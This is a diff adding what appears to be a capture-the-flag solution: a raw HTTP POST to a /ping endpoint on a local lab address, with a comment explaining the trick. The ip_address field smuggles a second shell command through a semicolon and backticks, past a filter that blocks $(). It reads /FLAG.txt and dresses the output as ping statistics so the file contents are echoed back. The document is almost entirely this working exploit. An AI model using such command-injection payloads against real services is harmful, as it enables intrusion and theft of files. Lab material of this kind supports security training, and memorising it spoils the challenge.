@@ -1,0 +1,8 @@
+# OS Command Injection via semicolon + backtick substitution. Crafts output matching the ping stats regex '(.*?) packets transmitted...' to exfiltrate /FLAG.txt contents via the Packets Transmitted field. Filter blocks $() but not backticks.
+
+POST /ping HTTP/1.1
+Host: 172.17.0.1:33615
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+
+ip_address=INVALID%3B+echo+%60cat+%2FFLAG.txt%60+packets+transmitted%2C+0+received%2C+0%25+packet+loss
